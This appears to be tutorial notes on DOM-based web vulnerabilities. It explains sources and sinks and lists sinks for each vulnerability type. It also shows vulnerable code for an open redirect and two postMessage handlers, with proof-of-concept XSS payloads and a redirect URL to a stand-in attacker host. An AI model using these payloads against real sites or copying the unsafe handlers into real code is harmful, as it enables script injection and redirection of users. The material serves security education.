# What is DOM 

**There is two terms to find DOM Vulnerbility**
  1- Source
  2- Sink
 
### Source:
 ```
 A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a 
 source is the `location.search` property because it reads input from the query string, which is relatively simple 
 for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. 
 This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the 
 `document.cookie` string), and web messages.**
 ```
### Sink: 
  ```
  A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if 
  attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes 
  the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it
  potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.
  ```
The most common source is the URL, which is typically accessed with the `location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. Consider the following code:
```js
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```
This is vulnerable to DOM-based open redirection because the `location.hash` source is handled in an unsafe way. If the URL contains a hash fragment that starts with `https:`, this code extracts the value of the `location.hash` property and sets it as the location property of the window. An attacker could exploit this vulnerability by constructing the following URL:
 - ```https://www.innocent-website.com/example#https://www.evil-user.net```
 
 ## Which sink can lead to DOM-based Vulnerabilities?
 
 #### The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks, please refer to the vulnerability-specific pages by clicking the links below.
 
|DOM-based vulnerability		|		Example sink            |     
|-------------------------------|-------------------------------|		
|DOM XSS            					|		document.write()		|			
|Open redirection LABS			|		window.location			|			
|Cookie manipulation LABS		|		document.cookie			|		
|JavaScript injection			|		eval()					|
|Document-domain manipulation	|		document.domain				|	
|WebSocket-URL poisoning		|		WebSocket()					|
|Link manipulation				|		element.src 				|	
|Web message manipulation		|		postMessage()				|	
|Ajax request-header manipulation|		setRequestHeader()			|	
|Local file-path manipulation	|		FileReader.readAsText()		|		
|Client-side SQL injection		|		ExecuteSql()				|	
|HTML5-storage manipulation		|		sessionStorage.setItem()	|		
|Client-side XPath injection	|		document.evaluate()			|	
|Client-side JSON injection		|		JSON.parse()				|		
|DOM-data manipulation			|		element.setAttribute()		|			
|Denial of service				|		RegExp()					|
 
 
 ## Exploiting web message 
 
 **1- Exploit the postMessage Vulnerability:**
  ```js
  Here is vulnerable code:
  window.addEventListener('message', function(e) {
          document.getElementById('ads').innerHTML = e.data;
   })

  ```
  *Exploit:*
  
    - Goto the source tab add breakpoint to document.getElement
    - Goto the console tab
    - window.postMessage('<img src=x onerror=alert(1)>','*')
    - You should get alert popup


**2- Explot postMessage Vulnerability:**

  Here is vulnerable code:
  ```js
  window.addEventListener('message', function(e) {
      var url = e.data;
          if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                  location.href = url;
           }
  }, false);
  ```

   *Analysis:*
    This script sends a web message containing an arbitrary JavaScript payload, along with the string "http:". The second argument 
    specifies that any targetOrigin is allowed for the web message.

   When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the 
   "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.

  **Exploit:** 
  
    1- Goto the developer tool in source tab add breakpoint to the `url` var.   
    2- Then goto the console tab type 
        window.postMessage('javascript:alert(1)//http:','*')
    3- You can Iframe to exploit for poc


 
 
 
 
 
 
 
 
 
